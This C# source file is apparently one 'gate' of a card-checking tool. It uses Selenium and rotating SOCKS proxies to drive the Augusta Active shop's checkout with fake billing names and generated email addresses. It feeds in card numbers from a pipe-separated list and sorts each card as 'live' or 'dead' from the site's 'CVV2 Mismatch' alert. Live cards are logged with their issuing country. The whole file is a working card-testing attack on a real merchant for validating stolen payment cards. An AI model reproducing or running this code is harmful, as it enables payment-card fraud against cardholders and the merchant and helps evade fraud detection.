using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Augustaactive
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run == true)
            {

                Form1.circularProgressBar1.Value = 5;
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();
                Socks socks = new Socks();
                var prox = socks.proxy();

                var ip = prox.Split(':');

                var ipUp = ip[1].ToString().Replace("//", "");
                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--proxy-server=" + prox, "--ignore-certificate-errors");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);


                try
                {
                    driver.Url = "https://www.augustaactive.com/accessories/headwear#/sort:final_price:asc/perpage:500";
                    //driver.Url = "https://whatismyipaddress.com/es/mi-ip";
                }
                catch (Exception)
                {
                    socks.proxyUp(ipUp);
                    restart();
                }

               


                Thread.Sleep(5000);
                correo = "joseffernana" + getNum() + "@hotmail.com";



                try
                {

                    if (tiempoElemento(By.XPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]")))
                    {
                        if (driver.FindElementByXPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]").Displayed == true)
                        {
                            driver.FindElementByXPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]").Click();
                            Thread.Sleep(1000);
                        }
                    }
                    else
                    {
                        restart();
                    }

                    var producto = "//*[@id='top']/body/div[2]/div/div[4]/div/div[3]/div[2]/ul/li[" + RandomNumber(1, 80) + "]/div/h2/a";

                    if (tiempoElemento(By.XPath(producto)))
                    {
                        driver.FindElementByXPath(producto).Click();
                        Thread.Sleep(3000);
                        if (IsElementPresent(By.XPath("//*[@id='product_addtocart_form']/div[3]/div[8]/div[2]/div[2]/button")))
                        {

                            if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div[1]/div[1]")))
                            {
                                driver.FindElementByXPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div[1]/div[1]").Click();
                                Thread.Sleep(1000);
                            }

                            if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[1]")))
                            {
                                driver.FindElement(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[1]")).Click();
                                Thread.Sleep(1000);
                            }


                            if (IsElementPresent(By.Id("amconf-images-container-92")))
                            {
                                driver.FindElement(By.Id("amconf-images-container-92")).Click();
                                Thread.Sleep(1000);
                            }

                            if (IsElementPresent(By.Id("low-stock-indicator")))
                            {
                                if (driver.FindElementById("low-stock-indicator").Displayed == true)
                                {
                                    if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[4]")))
                                    {
                                        driver.FindElementByXPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[4]").Click();
                                        Thread.Sleep(1000);
                                    }

                                    if (IsElementPresent(By.Id("low-stock-indicator")))
                                    {
                                        if (driver.FindElementById("low-stock-indicator").Displayed == true)
                                        {
                                            load2();
                                        }

                                    }
                                }

                            }

                            driver.FindElementByXPath("//*[@id='product_addtocart_form']/div[3]/div[8]/div[2]/div[2]/button").Click();
                            Thread.Sleep(1000);
                            driver.Navigate().GoToUrl("https://www.augustaactive.com/checkout/cart/?___SID=S");
                            Thread.Sleep(1000);
                            if (tiempoElemento(By.XPath("//*[@id='top']/body/div[2]/div/div[4]/div/div/div/div[3]/div/ul/li[5]/button")))
                            {
                                driver.FindElementByXPath("//*[@id='top']/body/div[2]/div/div[4]/div/div/div/div[3]/div/ul/li[5]/button").Click();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("//*[@id='checkout-step-login']/div/div[1]/div/ul/li[1]/label")))
                                {
                                    driver.FindElementByXPath("//*[@id='checkout-step-login']/div/div[1]/div/ul/li[1]/label").Click();
                                    Thread.Sleep(1000);
                                    driver.FindElementByXPath("//*[@id='checkout-step-login']/div/div[1]/div/div/button").Click();
                                    Thread.Sleep(1000);
                                    if (tiempoElemento(By.Id("billing:firstname")))
                                    {
                                        driver.FindElementById("billing:firstname").SendKeys("jorge");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:lastname").SendKeys("reyes");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:email").SendKeys(correo);
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:street1").SendKeys("street " + RandomNumber(22, 99));
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:city").SendKeys("miami");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:postcode").SendKeys("33206");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:telephone").SendKeys("213457" + RandomNumber(1000, 9999));
                                        Thread.Sleep(300);
                                        var estado = new SelectElement(driver.FindElementById("billing:region_id"));
                                        estado.SelectByValue("18");
                                        Thread.Sleep(500);
                                        driver.FindElement(By.XPath("//*[@id='billingsavebutton']")).Click();
                                        Thread.Sleep(2000);
                                        if (tiempoElemento(By.XPath("//*[@id='checkout-shipping-method-load']/div/div[1]/dl/dd/ul/li[2]/label")))
                                        {
                                            driver.FindElementByXPath("//*[@id='checkout-shipping-method-load']/div/div[1]/dl/dd/ul/li[2]/label").Click();
                                            Thread.Sleep(2000);
                                            driver.FindElementByXPath("//*[@id='shipping-method-buttons-container']/button").Click();
                                            Thread.Sleep(1000);
                                            if (tiempoElemento(By.XPath("//*[@id='dt_method_verisign']/label")))
                                            {
                                                driver.FindElement(By.XPath("//*[@id='dt_method_verisign']/label")).Click();
                                                Thread.Sleep(2000);
                                                driver.ExecuteJavaScript("document.querySelector('#co-payment-form > div').remove()");
                                                Thread.Sleep(1000);
                                                if (tiempoElemento(By.Id("verisign_cc_number")))
                                                {
                                                    pago();
                                                }
                                                else
                                                {
                                                    restart();
                                                }
                                            
                                            }
                                            
                                            else
                                            {
                                                restart();
                                            }
                                        }
                                        else
                                        {
                                            restart();
                                        }
                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            load2();
                        }

                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }

                }

            }
            else
            {
                stop();
            }
        }


        public void load2()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run == true)
            {

                Form1.circularProgressBar1.Value = 5;

                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();



                driver.Url = "https://www.augustaactive.com/accessories/headwear#/sort:final_price:asc/perpage:500";
                Thread.Sleep(5000);
                correo = "joseffernana" + getNum() + "@hotmail.com";



                try
                {

                    if (IsElementPresent(By.XPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]")))
                    {
                        if (driver.FindElementByXPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]").Displayed == true)
                        {
                            driver.FindElementByXPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]").Click();
                            Thread.Sleep(1000);
                        }
                    }

                    var producto = "//*[@id='top']/body/div[2]/div/div[4]/div/div[3]/div[2]/ul/li[" + RandomNumber(1, 80) + "]/div/h2/a";

                    if (tiempoElemento(By.XPath(producto)))
                    {
                        driver.FindElementByXPath(producto).Click();
                        Thread.Sleep(3000);
                        if (IsElementPresent(By.XPath("//*[@id='product_addtocart_form']/div[3]/div[8]/div[2]/div[2]/button")))
                        {

                            if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div[1]/div[1]")))
                            {
                                driver.FindElementByXPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div[1]/div[1]").Click();
                                Thread.Sleep(1000);
                            }

                            if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[1]")))
                            {
                                driver.FindElement(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[1]")).Click();
                                Thread.Sleep(1000);
                            }


                            if (IsElementPresent(By.Id("amconf-images-container-92")))
                            {
                                driver.FindElement(By.Id("amconf-images-container-92")).Click();
                                Thread.Sleep(1000);
                            }

                            if (IsElementPresent(By.Id("low-stock-indicator")))
                            {

                                if (driver.FindElementById("low-stock-indicator").Displayed == true)
                                {
                                    if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[4]")))
                                    {
                                        driver.FindElementByXPath("/html/body/div[2]/div/div[4]/div/div[2]/div[2]/div[1]/form/div[3]/div[5]/dl/dd[2]/div/div/div[4]").Click();
                                        Thread.Sleep(1000);
                                    }

                                    if (IsElementPresent(By.Id("low-stock-indicator")))
                                    {
                                        if (driver.FindElementById("low-stock-indicator").Displayed == true)
                                        {
                                            load2();
                                        }

                                    }
                                }
                            }


                            driver.FindElementByXPath("//*[@id='product_addtocart_form']/div[3]/div[8]/div[2]/div[2]/button").Click();
                            Thread.Sleep(1000);
                            driver.Navigate().GoToUrl("https://www.augustaactive.com/checkout/cart/?___SID=S");
                            Thread.Sleep(1000);
                            if (tiempoElemento(By.XPath("//*[@id='top']/body/div[2]/div/div[4]/div/div/div/div[3]/div/ul/li[5]/button")))
                            {
                                driver.FindElementByXPath("//*[@id='top']/body/div[2]/div/div[4]/div/div/div/div[3]/div/ul/li[5]/button").Click();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("//*[@id='checkout-step-login']/div/div[1]/div/ul/li[1]/label")))
                                {
                                    driver.FindElementByXPath("//*[@id='checkout-step-login']/div/div[1]/div/ul/li[1]/label").Click();
                                    Thread.Sleep(1000);
                                    driver.FindElementByXPath("//*[@id='checkout-step-login']/div/div[1]/div/div/button").Click();
                                    Thread.Sleep(1000);
                                    if (tiempoElemento(By.Id("billing:firstname")))
                                    {
                                        driver.FindElementById("billing:firstname").SendKeys("jorge");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:lastname").SendKeys("reyes");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:email").SendKeys(correo);
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:street1").SendKeys("street " + RandomNumber(22, 99));
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:city").SendKeys("miami");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:postcode").SendKeys("33206");
                                        Thread.Sleep(300);
                                        driver.FindElementById("billing:telephone").SendKeys("213457" + RandomNumber(1000, 9999));
                                        Thread.Sleep(300);
                                        var estado = new SelectElement(driver.FindElementById("billing:region_id"));
                                        estado.SelectByValue("18");
                                        Thread.Sleep(500);
                                        driver.FindElement(By.XPath("//*[@id='billingsavebutton']")).Click();
                                        Thread.Sleep(2000);
                                        if (tiempoElemento(By.XPath("//*[@id='checkout-shipping-method-load']/div/div[1]/dl/dd/ul/li[2]/label")))
                                        {
                                            driver.FindElementByXPath("//*[@id='checkout-shipping-method-load']/div/div[1]/dl/dd/ul/li[2]/label").Click();
                                            Thread.Sleep(2000);
                                            driver.FindElementByXPath("//*[@id='shipping-method-buttons-container']/button").Click();
                                            Thread.Sleep(1000);
                                            if (tiempoElemento(By.XPath("//*[@id='dt_method_verisign']/label")))
                                            {
                                                driver.FindElement(By.XPath("//*[@id='dt_method_verisign']/label")).Click();
                                                Thread.Sleep(2000);
                                                driver.ExecuteJavaScript("document.querySelector('#co-payment-form > div').remove()");
                                                Thread.Sleep(1000);
                                                if (tiempoElemento(By.Id("verisign_cc_number")))
                                                {
                                                    pago();
                                                }
                                                else
                                                {
                                                    restart();
                                                }

                                            }

                                            else
                                            {
                                                restart();
                                            }
                                        }
                                        else
                                        {
                                            restart();
                                        }
                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                                load2();
                        }

                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }

                }

            }
            else
            {
                stop();
            }
        }

        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run == true)
                {
                    if (pagos < 3)
                    {
                        Form1.circularProgressBar1.Value = 80;

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        if (tiempoElemento(By.Id("verisign_cc_number")))
                        {
                            driver.FindElementById("verisign_cc_number").SendKeys(ccnum);
                            Thread.Sleep(500);
                            var mes = new SelectElement(driver.FindElementById("verisign_expiration"));
                            mes.SelectByValue(Int16.Parse(ccLine[1]).ToString());
                            Thread.Sleep(500);
                            var anio = new SelectElement(driver.FindElementById("verisign_expiration_yr"));
                            anio.SelectByValue(Int16.Parse(ccLine[2]).ToString());
                            Thread.Sleep(500);
                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.Id("verisign_cc_cid")).SendKeys((ccLine[3]));
                            }

                            if (ccLine[3].Trim().Length == 4)
                            {
                                driver.FindElement(By.Id("verisign_cc_cid")).SendKeys((ccLine[3]));
                            }

                            Thread.Sleep(1000);

                            var tipocc = new SelectElement(driver.FindElementById("verisign_cc_type"));

                            if (ccnum[0].ToString().Trim() == "3")
                            {
                                tipocc.SelectByValue("AE");
                            }

                            if (ccnum[0].ToString().Trim() == "5")
                            {
                                tipocc.SelectByValue("MC");
                            }

                            if (ccnum[0].ToString().Trim() == "4")
                            {
                                tipocc.SelectByValue("VI");
                            }

                            if (ccnum[0].ToString().Trim() == "6")
                            {
                                tipocc.SelectByValue("DI");
                            }

                            Thread.Sleep(1000);
                            driver.FindElementByXPath("//*[@id='payment-buttons-container']/button").Click();
                            Thread.Sleep(3000);
                            if (tiempoElemento(By.XPath("//*[@id='review-buttons-container']/button")))
                            {
                                driver.FindElement(By.XPath("//*[@id='review-buttons-container']/button")).Click();
                                Thread.Sleep(4000);
                                Thread.Sleep(5000);
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }


                        Form1.circularProgressBar1.Value = 95;

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");

                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            var a = driver.SwitchTo().Alert().Text;

            while (estado == "")
            {

                if (tiempo < 30)
                {



                    a = driver.SwitchTo().Alert().Text;

                    if(a.Trim()== "CVV2 Mismatch")
                    {
                        estado = "live";
                    }
                    else
                    {
                        estado = "dead";
                    }



                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }



            if (estado == "dead")
            {

                driver.SwitchTo().Alert().Dismiss();
                Thread.Sleep(1000);
                driver.FindElement(By.XPath("//*[@id='payment-progress-opcheckout']/dt/span/a")).Click();
                Thread.Sleep(1000);
                driver.FindElementById("verisign_cc_number").Clear();
                Thread.Sleep(500);
                driver.FindElement(By.Id("verisign_cc_cid")).Clear();
                Thread.Sleep(1000);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

